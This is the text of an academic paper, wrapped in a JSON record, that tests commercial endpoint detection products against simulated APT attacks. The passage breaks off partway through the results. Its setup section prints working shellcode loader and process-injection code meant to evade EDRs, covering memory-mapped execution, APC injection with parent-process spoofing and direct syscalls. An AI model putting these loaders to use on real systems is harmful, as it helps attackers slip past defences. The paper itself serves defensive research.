{
    "id": "b48ac1ed-94f8-4dc3-bf60-315c78149f95",
    "created_at": "2023-01-12T14:59:56.667186Z",
    "updated_at": "2025-03-27T02:09:29.539829Z",
    "deleted_at": null,
    "sha1_hash": "b798f7d59fab5b25b8bfdc027eb20b9a6a118bc7",
    "title": "An Empirical Assessment of Endpoint Detection and Response Systems against Advanced Persistent Threats Attack Vectors",
    "authors": "",
    "file_creation_date": "2021-07-09T20:09:30Z",
    "file_modification_date": "2021-07-09T14:16:29Z",
    "file_size": 5733972,
    "plain_text": "Journal of\n## Cybersecurity and Privacy\n\n_Article_\n# An Empirical Assessment of Endpoint Detection and Response Systems against Advanced Persistent Threats Attack Vectors\n\n**George Karantzas** **[1]** **and Constantinos Patsakis** **[1,2,]***\n\n1 Department of Informatics, University of Piraeus, 80 Karaoli & Dimitriou Str., 18534 Piraeus, Greece;\ngck.kara@gmail.com\n2 Information Management Systems Institute, Athena Research Center, Artemidos 6, 15125 Marousi, Greece\n***** Correspondence: kpatsak@unipi.gr; Tel.: +30-2104142261\n\n**Abstract: Advanced persistent threats pose a significant challenge for blue teams as they apply**\nvarious attacks over prolonged periods, impeding event correlation and their detection. In this work,\nwe leverage various diverse attack scenarios to assess the efficacy of EDRs against detecting and\npreventing APTs. Our results indicate that there is still a lot of room for improvement as state-of-theart EDRs fail to prevent and log the bulk of the attacks that are reported in this work. Additionally, we\ndiscuss methods to tamper with the telemetry providers of EDRs, allowing an adversary to perform\na more stealth attack.\n\n**Keywords: advanced persistent threats; EDR; malware; evasion**\n\n**1. Introduction**\n\n\n**Citation: Karantzas, G.; Patsakis, C.**\n\nAn Empirical Assessment of\n\nEndpoint Detection and Response\n\nSystems against Advanced Persistent\n\nThreats Widely Used Attack Vectors.\n\n_J. Cybersecur. Priv. 2021, 1, 387–421._\n\n[https://doi.org/10.3390/jcp1030021](https://doi.org/10.3390/jcp1030021)\n\nAcademic Editor: Nour Moustafa\n\nReceived: 17 May 2021\n\nAccepted: 6 July 2021\n\nPublished: 9 July 2021\n\n**Publisher’s Note: MDPI stays neutral**\n\nwith regard to jurisdictional claims in\n\npublished maps and institutional affil\niations.\n\n**Copyright: © 2021 by the authors.**\n\nLicensee MDPI, Basel, Switzerland.\n\nThis article is an open access article\n\ndistributed under the terms and\n\nconditions of the Creative Commons\n\n[Attribution (CC BY) license (https://](https://creativecommons.org/licenses/by/4.0/)\n\n[creativecommons.org/licenses/by/](https://creativecommons.org/licenses/by/4.0/)\n\n4.0/).\n\n\nCyber attacks are constantly evolving in both sophistication and scale, reaching such\nan extent that the World Economic Forum considers it the second most threatening risk\nfor global commerce over the next decade [1]. The underground economy that has been\ncreated has become so huge to the point of being comparable to the size of national\neconomies. Contrary to most cyberattacks which have a ‘hit-and-run’ modus operandi,\nwe have advanced persistent threats, most widely known through the abbreviation APT.\nIn most cyber attacks, the threat actor would try to exploit a single exploit or mechanism\nto compromise as many hosts as possible and try to immediately monetize the abuse of\nthe stored information and resources as soon as possible. However, in APT attacks, the\nthreat actor opts to keep a low profile, exploiting more complex intrusion methods through\nvarious attack vectors and prolong the control of the compromised hosts. Indeed, this\ncontrol may span several years, as numerous such incidents have shown.\nDue to their nature and impact, these attacks have received a lot of research focus\nas the heterogeneity of the attack vectors introduces many issues for traditional security\nmechanisms. For instance, due to their stealth character, APTs bypass antiviruses; therefore, more advanced methods are needed to detect them in a timely manner. Endpoint\nDetection and Response (EDR) systems provide a more holistic approach to the security\nof an organization as beyond signatures, EDRs correlate information and events across\nmultiple hosts of an organization. Therefore, individual events from endpoints that could\nfall below the radar are collected, processed, and correlated, providing blue teams with a\ndeep insight into the threats that an organization’s perimeter is exposed to.\nDespite the research efforts and the advanced security mechanisms deployed through\nEDRs, recent events illustrate that we are far from being considered safe from such attacks.\nSince APT attacks are not that common and not all details can be publicly shared, we argue\nthat a sanity check to assess the preparedness of such security mechanisms against such\nattacks is deemed necessary. Therefore, we decided to conduct an APT group simulation\nto test the enterprise defenses’ capabilities and especially EDRs. To this end, we opted to\nsimulate an APT attack in a controlled environment using a set of scripted attacks which\n\n\n-----\n\n_J. Cybersecur. Priv. 2021, 1_ 388\n\nmatch the typical modus operandi of these attacks. Thus, we try to infiltrate an organization\nusing spear-phishing and malware delivery techniques and then examine the IOCs and\nresponses produced by the EDRs. We have created four such use case scenarios which\nare rather indicative and diverse enough to illustrate the weak points of several perimeter\nsecurity mechanisms, and more precisely EDRs.\nBased on the above, the contribution of our work is dual. First, we illustrate that,\ndespite the advances in static and dynamic analysis, as well as multiple log collection\nmechanisms that are applied by state-of-the-art EDRs, there are multiple ways that a threat\nactor may launch a successful attack without raising suspicions. As it will be discussed,\nwhile some of the EDRs may log fragments of the attacks, this does not imply that these\nlogs will trigger an alert. Moreover, even if an alert is triggered, one has to consider it from\nthe security operations center (SOC) perspective. Practically, an SOC receives multiple\nalerts and each one with different severity. These alerts are prioritized and investigated\naccording to this severity. Therefore, low severity alerts may slip below the radar and not\nbe investigated, especially once the amount of alerts in an SOC is high [2]. Furthermore,\nwe discuss how telemetry providers of EDRs can be tampered with, allowing an adversary\nto hide her attack and trails. To the best of our knowledge, there is no empirical assessment\nof the efficacy of real-world EDRs in scientific literature, nor conducted in a systematic\nway to highlight their underlying issues in a unified way. Beyond scientific literature,\n[we consider that the closest work is MITRE Engenuity (https://mitre-engenuity.org/ last](https://mitre-engenuity.org/)\naccessed: 8 July 2021); however, our work provides the technical details for each step, from\nthe attacker’s perspective. Moreover, we differ from the typical APT capabilities that are\nreported for each known group using and modifying off the shelf tools. Therefore, this\nwork is the first one conducting such an assessment. By no means should this work serve\nas a guidance on security investment on any specific EDR solution. As it will be discussed\nlater on, the outcomes of this work try to point out specific representative attack vectors\nand cannot grasp the overall picture of all possible attacks that EDRs can mitigate. Indeed,\ncustomization of EDRs rules may significantly change their efficacy; nevertheless, the latter\ndepends on the experience of the blue teams handling these systems.\nThe rest of this work is organized as follows. In the following section, we provide\nan overview of the related work regarding EDRs and APT attacks. Then, we present our\nexperimental setup and detail the technical aspects of our four attack vectors. In Section 4,\nwe evaluate eleven state-of-the-art EDRs and assess their efficacy in detecting and reporting\nour four attacks. Next, in Section 5, we present tampering attacks on telemetry providers\nof EDRs and their impact. Finally, the article concludes by providing a summary of our\ncontributions and discussing ideas for future work.\n\n**2. Related Work**\n_2.1. Endpoint Detection and Response Systems_\n\nThe term endpoint detection and response (EDR), also known as endpoint threat\ndetection and response (ETDR), was coined by A. Chuvakin [3] back in 2013. As the name\nimplies, this is an endpoint security mechanism that does not cover the networking. EDRs\ncollect data from endpoints and send them for storage and processing in a centralized\ndatabase. There, the collected events, binaries, etc., will be correlated in real-time to detect\nand analyze suspicious activities on the monitored hosts. Thus, EDRs boost the capabilities\nof SOCs as they discover and alert both the user and the emergency response teams of\nemerging cyber threats.\nEDRs are heavily rule-based; nevertheless, machine learning or AI methods have\ngradually found their way into these systems to facilitate finding new patterns and correlations. An EDR extends antivirus capabilities as an EDR will trigger an alert once it\ndetects anomalous behavior. Therefore, an EDR may detect unknown threats and prevent\nthem before they become harmful due to the behavior and not just merely the signatures.\nWhile behavioral patterns may sound ideal for detecting malicious acts, this also implies\nmany false positives, that is, benign user actions considered malicious, as EDRs prioritize\n\n\n-----\n\n_J. Cybersecur. Priv. 2021, 1_ 389\n\nprecision over recall. Therefore, SOCs have to deal with sheer amounts of noise as many of\nthe received alerts are false [4]. This is the reason why Hassan et al. recently introduced\nTactical Provenance Graphs (TPG) [5]. They reason about the causal dependencies between\nthe threat alerts of an EDR and improve the visualization of multistage attacks. Moreover,\ntheir system, RapSheet, has a different scoring system that significantly reduces the false\npositive rate. Finally, an EDR can perform remediation or removal tasks for specific threats.\nDespite the significant boost in security that EDRs bring, the overall security of the\norganization highly depends on the human factor. In the case of the blue teams, the results\nagainst an attack are expected to greatly vary between fully trained teams in Incident\nResponse and teams that solely respond to specific detected threats and are dependent on\nthe output of a single security tool. However, both teams are expected to be triggered by,\nand later investigated for, the telemetry from EDRs. Since the experience and the capacity\nof the blue team depends on multiple factors which are beyond the scope of our work, in\nthis study, we focus on the telemetry of the EDRs, the significance that they label events,\nand whether they blocked some actions.\nNevertheless, we highlight that not all EDRs allow the same amount of customization\nnor implementation of the same policies. Moreover, blue teams cannot have the experience\nin all EDRs to configure them appropriately as each team will specialize in a limited set\nof solutions due to familiarity with a platform, marketing, or even customer policies.\nMoreover, not all blue teams face the same threats, which may significantly bias the\nprioritization of rules that blue teams would include in an installation, let alone the client\nneeds. The above constitute diverse factors that cannot be studied in the context of this\nwork. On the contrary, we should expect that a baseline security when opting in for all\npossible security measures should be more or less the same across most EDRs. Moreover,\none would expect that, even if the EDR failed to block an attack, it should have at least\nlogged the actions so that one can later process it. However, our experiments show that\noften this is not the case.\n\n_2.2. Advanced Persistent Threats_\n\nThe term advanced persistent threat (APT) is used to describe an attack in which the\nthreat actor establishes stealth, long-term persistence on a victim’s computing infrastructure.\nThe usual goal is to exfiltrate data or to disrupt services when deemed necessary by the\nthreat actor. These attacks differ from the typical ‘hit and run’ modus operandi as they may\nspan from months up to years. The attacks are launched by high-skilled groups, which are\neither a nation state or state-sponsored.\nAs noted by Chen et al. [6], APT attacks consist of six phases: (1) reconnaissance and\nweaponization; (2) delivery; (3) initial intrusion; (4) command and control; (5) lateral movement; and (6) data exfiltration. Complimentary to this model, other works [7,8] consider\nattack trees to represent APTs as different paths may be used in parallel to get the foothold\non the targeted resources. Thus, information flows are often used to detect APTs [9], along\nwith anomaly detection, sandboxing, pattern matching, and graph analysis [10]. The latter\nimplies that EDRs may serve as excellent means to counter APT attacks.\nIn many such attacks, threat actors use fileless malware [11], a particular type of malware\nthat does not leave any malicious fingerprint on the filesystem of the victim as they operate\nin memory. The core idea behind this is that the victim will be lured into opening a benign\nbinary, e.g., using social engineering, and this binary will be used to execute a set of\nmalicious tasks. In fact, there are plenty of binaries and scripts preinstalled in Windows or\nlater downloaded by the OS and are either digitally signed or whitelisted by the operating\nsystem and enable a set of exploitable functionalities to be performed. Since they are\ndigitally signed by Microsoft, User Account Control (UAC) allows them to perform a set of\ntasks without issuing any alert to the user. These binaries and scripts are commonly known\nas Living Off The Land Binaries and Scripts (and also Libraries), or LOLBAS/LOLBINS [12].\n\n\n-----\n\n_J. Cybersecur. Priv. 2021, 1_ 390\n\n_2.3. Cyber Kill Chain_\n\nCyber kill chain is a model which allows security analysts to deconstruct a cyber\nattack, despite its complexity, into mutually nonexclusive phases [13]. The fact that each\nphase is isolated from the others allows one to analyze each part of the attack individually\nand create mitigation methods and detection rules that can facilitate defense mechanisms\nfor the attack under question or similar ones. Moreover, blue teams have to address smaller\nproblems, one at a time which is far more resource efficient than facing a big problem as\na whole. In the cyber kill chain model, we consider that a threat actor tries to infiltrate\na computer network in a set of sequential, incremental, and progressive steps. Thus, if\nany stage of the attack is prevented, then the attack will not be successful. Therefore, the\nsmall steps that we referred above are crucial in countering a cyber attack, and the earlier\nphase one manages to prevent an attack, the smaller impact it will have. While the model is\nrather flexible, it has undergone some updates to fit more targeted use cases, e.g., Internal\nCyber Kill Chain to address issues with internal malicious actors, such as a disgruntled or\ndisloyal employee.\nMITRE’s ATT&CK [14] is a knowledge base and model which tries to describe the\nbehavior of a threat actor throughout the attack lifecycle from reconnaissance and exploitation, to persistence and impact. To this end, ATT&CK provides a comprehensive way to\ncategorize the tactics, techniques, and procedures of an adversary, abstracting from the underlying operating system and infrastructure. Based on the above, using ATT&CK one can\n[emulate threat scenarios (https://attack.mitre.org/resources/adversary-emulation-plans/](https://attack.mitre.org/resources/adversary-emulation-plans/)\naccessed on 8 July 2021) or assess the efficacy of deployed defense mechanisms against\n[common adversary techniques. More recently, Pols introduced the Unified Kill Chain (](https://www.unifiedkillchain.com/assets/The-Unified-Kill-Chain.pdf)\n[https://www.unifiedkillchain.com/assets/The-Unified-Kill-Chain.pdf accessed on 8 July](https://www.unifiedkillchain.com/assets/The-Unified-Kill-Chain.pdf)\n2021), which extends and combines Cyber Kill Chain and MITRE’s ATT&CK. The Unified\nKill Chain addresses issues that are not covered by Cyber Kill Chain and ATT&CK as,\namong others, it models adversaries’ behaviors beyond the organizational perimeter, users’\nroles, etc.\n\n**3. Experimental Setup**\n\nIn this section, we detail the preparation for our series of experiments to the EDRs.\nBecause our goal is to produce accurate and reproducible results, we provide the necessary\ncode where deemed necessary. To this end, we specifically design and run experiments to\nanswer the following research questions:\n\n           - **RQ1: Can state-of-the-art EDRs detect common APT attack methods?**\n\n           - **RQ2: Which are the blind spots of state-of-the-art EDRs?**\n\n           - **RQ3: What information is reported by EDRs and which is their significance?**\n\n           - **RQ4: How can one decrease the significance of reported events or even prevent the**\nreporting?\n\nUsing ATT&CK as a knowledge base and model, one can model the behavior of the\nthreat actor that we emulate as illustrated in Figure 1. Due to space limitations, we have\nopted to use a modified version of the standard ATT&CK matrix and used a radial circular\ndendrogram.\nIn this work, we perform an empirical assessment of the security of EDRs. The selected\n[EDRs were selected based on the latest Gartner’s 2021 report (https://www.gartner.com/](https://www.gartner.com/en/documents/4001307/magic-quadrant-for-endpoint-protection-platforms)\n[en/documents/4001307/magic-quadrant-for-endpoint-protection-platforms accessed on](https://www.gartner.com/en/documents/4001307/magic-quadrant-for-endpoint-protection-platforms)\n8 July 2021), as we included the vast majority of the leading EDRs in the market. The\nlatter implies that we cover a big and representative market share which, in fact, drives\nthe evolution and innovation in the sector. In our experiments, we opted to use the most\n[commonly used C2 framework, Cobalt Strike (https://www.cobaltstrike.com/ accessed](https://www.cobaltstrike.com/)\non 8 July 2021). It has been used in numerous operations by both threat actors and ‘red\nteams’ to infiltrate organizations [15].\n\n\n-----\n\n_J. Cybersecur. Priv. 2021, 1_ 391\n\n**Figure 1. ATT&CK model of the emulated threat actor.**\n\nMoreover, we used a mature domain; an expired domain with proper categorization\nthat will point to a VPS server hosting our Cobalt Strike team-server. This would cause\nless suspicion and hopefully bypass some restrictions as previous experience has shown\n[with parked domains and expired domains (https://blog.sucuri.net/2016/06/spam-via-](https://blog.sucuri.net/2016/06/spam-via-expired-domains.html)\n[expired-domains.html, https://unit42.paloaltonetworks.com/domain-parking/ accessed](https://blog.sucuri.net/2016/06/spam-via-expired-domains.html)\non 8 July 2021). We issued a valid SSL certificate for our C2 communication from Let’s\n_[Encrypt (https://letsencrypt.org/ accessed on 8 July 2021) to encrypt our traffic. Figure 2](https://letsencrypt.org/)_\nillustrates our domain and its categorization.\nCobalt Strike deploys agents named ‘beacons’ on the victim, allowing the attacker\nto perform multiple tasks on the compromised host. In our experiments, we used the\n[so-called malleable C2 profile (https://www.cobaltstrike.com/help-malleable-c2 accessed](https://www.cobaltstrike.com/help-malleable-c2)\non 8 July 2021) as it modifies the beacon’s fingerprint. This masks our network activity and\n\n\n-----\n\n_J. Cybersecur. Priv. 2021, 1_ 392\n\nour malware’s behavior, such as the staging process; see Listing A1 in Appendix A. Please\nnote that it has been slightly formatted for the sake of readability.\n\n**Figure 2. The domain pointing to our C2 Server (up) and its categorization (down).**\n\n_3.1. Attack Vectors_\n\nWe have structured four diverse yet real-world scenarios to perform our experiments,\nwhich simulate the ones used by threat actors in the wild. We believe that an empirical\nassessment of EDRs should reflect common attack patterns in the wild. Since the most\ncommonly used attack vector by APT groups is emails, as part of social engineering or\nspear phishing, we opted to use malicious attached files which the target victim would\nbe lured to execute them. Moreover, we should consider that, due to the high noise from\nfalse positives that EDRs report, it is imperative to consider the score that each event is\nattributed to. Therefore, in our work, we try to minimize the reported score of our actions\nin the most detailed setting of EDRs. With this approach, we guarantee that the attack will\npass below the radar.\nBased on the above, our hypothetical threat actor starts its attack with some spearphishing emails that try to lure the target user into opening a file or follow a link that will\nbe used to compromise the victim’s host. To this end, we have crafted some emails with\nlinks to cloud providers that lead to some custom malware. More precisely, the attack\nvectors are the following:\n\n           - A .cpl file: A DLL file which can be executed by double-clicking under the context\nof the rundll32 LOLBINS which can execute code maliciously under its context.\n[The file has been crafted using CPLResourceRunner (https://github.com/rvrsh3ll/](https://github.com/rvrsh3ll/CPLResourceRunner)\n[CPLResourceRunner accessed on 8 July 2021). To this end, we use a shellcode storage](https://github.com/rvrsh3ll/CPLResourceRunner)\n\n\n-----\n\n_J. Cybersecur. Priv. 2021, 1_ 393\n\ntechnique using Memory-mapped files (MMF) [16] and then trigger it using delegates;\nsee Listing 1.\n\n           - A legitimate Microsoft (MS) Teams installation that will load a malicious DLL. In this\n[regard, DLL side-loading (https://attack.mitre.org/techniques/T1574/002/accessed](https://attack.mitre.org/techniques/T1574/002/)\non 8 July 2021) will lead to a self-injection, thus allowing us to \"live\" under a signed\n[binary. To achieve this, we used the AQUARMOURY-Brownie (https://github.com/](https://github.com/slaeryan/AQUARMOURY)\n[slaeryan/AQUARMOURY accessed on 8 July 2021).](https://github.com/slaeryan/AQUARMOURY)\n\n           - An unsigned PE executable file; from now on referred to as EXE, that will\nexecute process injection using the “Early Bird” technique of AQUARMOURY into\n`werfault.exe.` For this, we spoofed the parent of explorer.exe using the\n```\n               PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY flag to protect our malware from\n\n```\nan unsigned by Microsoft DLL event that is commonly used by EDRs for\nprocesses monitoring.\n\n           - An HTA file. Once the user visits a harmless HTML page containing an IFrame, he will\nbe redirected and prompted to run an HTML file infused with executable VBS code\nthat will load the .NET code provided in Listing 2 and perform self-injection under\nthe context of mshta.exe.\n\n**Listing 1. Shellcode execution code from CPLResourceRunner.**\n```\n                mmf = MemoryMappedFile.CreateNew(\"__shellcode\", shellcode.Length,\n\n```\n_�→_ `MemoryMappedFileAccess.ReadWriteExecute);`\n```\n                // Create a memory mapped view accessor with read/write/execute permissions..\n                mmva = mmf.CreateViewAccessor(0, shellcode.Length, MemoryMappedFileAccess.ReadWriteExecute);\n                // Write the shellcode to the MMF..\n                mmva.WriteArray(0, shellcode, 0, shellcode.Length);\n                // Obtain a pointer to our MMF..\n                var pointer = (byte*)0;\n                mmva.SafeMemoryMappedViewHandle.AcquirePointer(ref pointer);\n                // Create a function delegate to the shellcode in our MMF..\n                var func = (GetPebDelegate)Marshal.GetDelegateForFunctionPointer(new IntPtr(pointer),\n\n```\n_�→_ `typeof(GetPebDelegate));`\n```\n                // Invoke the shellcode..\n                return func();\n\n```\nIn what follows, we solely evaluate EDRs against our attacks. Undoubtedly, in an\nenterprise environment, one would expect more security measures, e.g., a firewall, an\nantivirus, etc. However, despite improving the overall security of an organization, their\noutput is considered beyond the scope of this work.\n\n_3.2. Code Analysis_\n\nIn the following paragraphs, we detail the technical aspects of each attack vector.\n\n3.2.1. HTA\n\n[We used C# and the Gadget2JScript (https://github.com/med0x2e/GadgetToJScript](https://github.com/med0x2e/GadgetToJScript)\naccessed on 8 July 2021) tool to generate a serialized gadget that will be executed into memory; see Listing 2. ETWpCreateEtwThread is used to execute the shellcode by avoiding common APIs, such as CreateThread(). Note that, in the background, RtlCreateUserThread\n[is used (https://twitter.com/therealwover/status/1258157929418625025 accessed on 8](https://twitter.com/therealwover/status/1258157929418625025)\nJuly 2021).\n\n\n-----\n\n_J. Cybersecur. Priv. 2021, 1_ 394\n\n**Listing 2. Code to allocate space and execute shellcode via EtwpCreateEtwThread.**\n```\n                byte[] shellcode = { };\n                //xored shellcode\n                byte[] xored = new byte[] {REDACTED};\n                string key = \"mysecretkeee\";\n                shellcode = xor(xored, Encoding.ASCII.GetBytes(key));\n                uint old = 0;\n                // Gets current process handle\n                IntPtr procHandle = Process.GetCurrentProcess().Handle;\n                //Allocation and then change the page to RWX\n                IntPtr allocMemAddress = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)shellcode.Length,\n\n```\n_�→_ `MEM_COMMIT | MEM_RESERVE,`\n```\n                PAGE_READWRITE);\n                VirtualProtectEx(procHandle, allocMemAddress, (UIntPtr)shellcode.Length,\n\n```\n_�→_ `PAGE_EXECUTE_READWRITE, out old);`\n```\n                //Write the shellcode\n                UIntPtr bytesWritten;\n                WriteProcessMemory(procHandle, allocMemAddress, shellcode, (uint)shellcode.Length, out\n\n```\n_�→_ `bytesWritten);`\n```\n                EtwpCreateEtwThread(allocMemAddress, IntPtr.Zero);\n\n```\n3.2.2. EXE File\n\nThe main idea behind this attack is a rather simplistic code injection using executing\nour shellcode using the QueueUserAPC() API before the main method. It will launch a\n_sacrificial process with PPID spoofing and inject to that. The file will employ direct system_\ncalls in assembly to avoid hooked functions. It should be noted that the Windows Error\nReporting service (werfault) is an excellent target for injection as a child werfault process\nmay appear once a process crashes, meaning the parent can be arbitrary. This significantly\nimpedes parent-child relation investigation. Notably, once used with the correct flags, it\ncan avoid suspicions [17]. The relevant code can be found in Listing 3.\n\n3.2.3. DLL Sideloading\n\nIn this case, we used the Brownie-Koppeling projects to create an evil clone of a\nlegitimate DLL from system32 and added it to the folder of MS Teams so that our encrypted\nshellcode will be triggered under its process. Moreover, since MS Teams adds itself to the\nstartup, this provides us persistence to the compromised host. Note that EDRs sometimes\ntend to overlook self-injections as they consider that they do not alter different processes.\nIn Listing 4, we illustrate the shellcode execution method. It is a classic CreateThread()\nbased on local injection that will launch the shellcode under a signed and benign binary\nprocess. Unfortunately, the only problem, in this case, is that the DLL is not signed, which\nmay trigger some defense mechanisms. In the provided code, one can observe the usage of\n```\n             VirtualProtect(). This was made to avoid direct RWX memory allocation. In Listing 5,\n\n```\nwe can see the usage of assembly syscalls.\nFinally, it should be noted that, for the tests, the installation will be placed and\nexecuted in the Desktop folder manually. Figure 3 illustrates that MS Teams allows for DLL\nhijacking.\n\n\n-----\n\n_J. Cybersecur. Priv. 2021, 1_ 395\n\n**Listing 3. Execution of shellcode into a child process with CIG and spoofed PPID via the “EarlyBird”**\ntechnique using Nt* APIs.\n```\n                   // Assign CIG/blockdlls attribute\n                   DWORD64 CIGPolicy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;\n                   UpdateProcThreadAttribute(sie.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &CIGPolicy, 8,\n\n```\n_�→_ `NULL, NULL);`\n```\n                   //Open handle to parent process\n                   HANDLE hParentProcess;\n                   NTSTATUS status = NtOpenProcess(&hParentProcess, PROCESS_CREATE_PROCESS, &pObjectAttributes, &pClientId);\n                   if (status != STATUS_SUCCESS) {\n                   printf(\"[-] NtOpenProcess error: %X\\n\", status);\n                   return FALSE;\n                   }\n                   // Assign PPID Spoof attribute\n                   UpdateProcThreadAttribute(sie.lpAttributeList, 0,\n                   PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL);\n                   // Injection Code\n                   // Get handle to process and primary thread\n                   HANDLE hProcess = pi.hProcess;\n                   HANDLE hThread = pi.hThread;\n                   // Suspend the primary thread\n                   SuspendThread(hThread);\n                   // Allocating a RW memory buffer for the payload in the target process\n                   LPVOID pAlloc = NULL;\n                   SIZE_T uSize = payloadLen; // Store the payload length in a local variable\n                   status = NtAllocateVirtualMemory(hProcess, &pAlloc, 0, &uSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n                   if (status != STATUS_SUCCESS) {\n                   return FALSE;\n                   }\n                   // Writing the payload to the created buffer\n                   status = NtWriteVirtualMemory(hProcess, pAlloc, payload, payloadLen, NULL);\n                   if (status != STATUS_SUCCESS) {\n                   return FALSE;\n                   }\n                   // Change page protections of created buffer to RX so that payload can be executed\n                   ULONG oldProtection;\n                   LPVOID lpBaseAddress = pAlloc;\n                   status = NtProtectVirtualMemory(hProcess, &lpBaseAddress, &uSize, PAGE_EXECUTE_READ, &oldProtection);\n                   if (status != STATUS_SUCCESS) {\n                   return FALSE;\n                   }\n                   // Assigning the APC to the primary thread\n                   status = NtQueueApcThread(hThread, (PIO_APC_ROUTINE)pAlloc, pAlloc, NULL, NULL);\n                   if (status != STATUS_SUCCESS) {\n                   return FALSE;\n                   }\n                   // Resume the thread\n                   DWORD ret = ResumeThread(pi.hThread);\n                   if (ret == 0XFFFFFFFF)\n                   return FALSE;\n\n```\n\n-----\n\n_J. Cybersecur. Priv. 2021, 1_ 396\n\n**Listing 4. Local memory allocation and shellcode execution via CreateThread().**\n```\n                BOOL execute_shellcode(LPSTR payload, SIZE_T payloadLen) {\n                // Init some important variables\n                void* exec_mem;\n                BOOL ret;\n                HANDLE threadHandle;\n                DWORD oldProtect = 0;\n                // Allocate a RW memory buffer for payload\n                exec_mem = VirtualAlloc(0, payloadLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n                // Write payload to new buffer\n                RtlMoveMemory(exec_mem, payload, payloadLen);\n                // Make new buffer as RX so that payload can be executed\n                ret = VirtualProtect(exec_mem, payloadLen, PAGE_EXECUTE_READ, &oldProtect);\n                // Now, run the payload\n                if (ret != 0) {\n                threadHandle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);\n                WaitForSingleObject(threadHandle, -1);\n                }\n                return TRUE;\n                }\n\n```\n**Listing 5. Sample direct syscalls in Assembly.**\n```\n                ;Sample Syscalls\n                ; --------------------------------------------------------------------                ; Windows 7 SP1 / Server 2008 R2 specific syscalls\n                ; --------------------------------------------------------------------                NtWriteVirtualMemory7SP1 proc\n                mov r10, rcx\n                mov eax, 37h\n                syscall\n                ret\n                NtWriteVirtualMemory7SP1 endp\n                NtProtectVirtualMemory7SP1 proc\n                mov r10, rcx\n                mov eax, 4Dh\n                syscall\n                ret\n                NtProtectVirtualMemory7SP1 endp\n\n```\n\n-----\n\n_J. Cybersecur. Priv. 2021, 1_ 397\n\n**Figure 3. Using Process Explorer to find hijackable DLLs.**\n\n**4. EDR Evaluation**\n\nIn what follows, we evaluate eleven state-of-the-art EDRs against our attacks. To\nthis end, we provide a brief overview of each EDR and its features. Then, we proceed\nreporting which features were enabled and discuss how each of them performed in the\nattack scenario. EDRs are listed in alphabetical order.\n\n_4.1. Carbon Black_\n\nCarbon Black is one of the leading EDR solutions. Its true power comes from its\ntelemetry and its ability to extensively monitor every action performed on a system, such\nas registry modifications, network connections, etc., and, most importantly, provide an\nSOC-friendly interface to triage the host. Based on the telemetry collected from the sensor,\na comparison to several IoCs. The latter will be aggregated into a score which, depending\non its value, will trigger an alert. Moreover, when considering EDRs, configuration plays a\nvital role. Therefore, in this case, we have a custom SOC feed for detections based on IOCs\nthat Carbon Black processes. In addition, the feeds can be query-based, meaning that alerts\nwill be produced based on results yielded by searches based on the events that Carbon\nBlack processes, including but not limited to, registry modifications, network connections,\nand module loadings.\nThis EDR relies heavily on kernel callbacks and a lot of its functionalities reside in its\nnetwork filtering driver and its file system filtering driver. For several detections, usermode hooks are also used. As an example, consider the detection of memory dumping\n(DUMP_PROCESS_MEMORY). As mentioned in Carbon Black’s documentation, userland\nAPI hooks are set to detect a process memory dump. Another example is the detection of\nscript interpreters loaded into memory (HAS_SCRIPT_DLL). As mentioned in the documentation, a driver routine is set to identify processes that load an in-memory script interpreter.\n\n4.1.1. Enabled Settings\n\nCarbon Black Response is different in terms of logic and use case. Its main purpose is\nto provide telemetry and not to proactively act. Moreover, its scope is to assist during an\ninvestigation as it does not include blocking capabilities but is an SOC-friendly software\nthat gives in-depth visibility. Its power is closely related to the person behind the console\nas, beyond triaging hosts, its detection rely on feeds that can be customized and produce\n\n\n-----\n\n_J. Cybersecur. Priv. 2021, 1_ 398\n\nalerts. In our case, we used some default feeds, such as ATT&CK feed and Carbon Black’s\nCommunity Feed, as well as a custom corporate feed.\n\n4.1.2. CPL\n\nAs illustrated in Figure 4, an alert was triggered due to the abnormal name, location,\nand usage of Shell32.dll. Carbon Black is well aware of malicious .cpl files in this case,\nbut it cannot clearly verify whether this activity is indeed malicious. Therefore, the event\nis reported with a low score. Figure 5 illustrates, on the right side, the IOCs that were\ntriggered.\n\n**Figure 4. All alerts produced in Carbon Black.**\n\n**Figure 5. CPL’s IOCs produced by Carbon Black.**\n\n4.1.3. HTA\n\nThe .hta file was detected due to its parent process as a possible CVE and for a\nsuspicious loaded module. Carbon Black is aware of both LOLBAS and LOLBINS and\ndetected it in a timely manner, see Figure 6.\n\n**Figure 6. Carbon Black findings for HTA.**\n\n4.1.4. EXE-DLL\n\nRegarding the other two attack vectors, no alerts were raised. Nevertheless, their\nactivity was monitored normally and produced telemetry that the host communicates,\ndespite being able to communicate successfully to our domain. Finally, it should be noted\n\n\n-----\n\n_J. Cybersecur. Priv. 2021, 1_ 399\n\nthat the PPID spoofing did not succeed against Carbon Black. Results may be seen is\nFigure 7.\n\n**Figure 7. The findings of Carbon Black for the EXE and DLL attack vectors.**\n\n_4.2. CrowdStrike Falcon_\n\nCrowdStrike Falcon combines some of the most advanced behavioral detection features with a very intuitive user interface. The latter provides a clear view of the incident itself and the machine’s state during an attack through process trees and indicators of attacks.\nFalcon Insight’s kernel-mode driver captures more than 200 events and related information\nnecessary to retrace incidents. Besides the classic usage of kernel callbacks and user[mode hooks, Falcon also subscribes to ETWTi (https://www.reddit.com/r/crowdstrike/](https://www.reddit.com/r/crowdstrike/comments/n9to1b/interesting_stuff/gxq0t1t)\n[comments/n9to1b/interesting_stuff/gxq0t1t accessed on 8 July 2021).](https://www.reddit.com/r/crowdstrike/comments/n9to1b/interesting_stuff/gxq0t1t)\nWhen it comes to process injections, most EDRs, including Falcon, continuously check\nfor Windows APIs like VirtualAllocEx and NtMapViewOfSection prior to scanning the\nmemory. Once Falcon finds any of these called by any process, it quickly checks the\nallocated memory and whether this was a new thread created from a remote process. In\nthis case, it keeps track of the thread ID, extracts the full injected memory and parses the\n```\n             .text section, the Exports section, the PE header, the DOS header and displays the name\n\n```\nof the PE, start/stop date/time, not limited to the export address of the loaded function.\nAs for the response part, it provides extensive real-time response capabilities 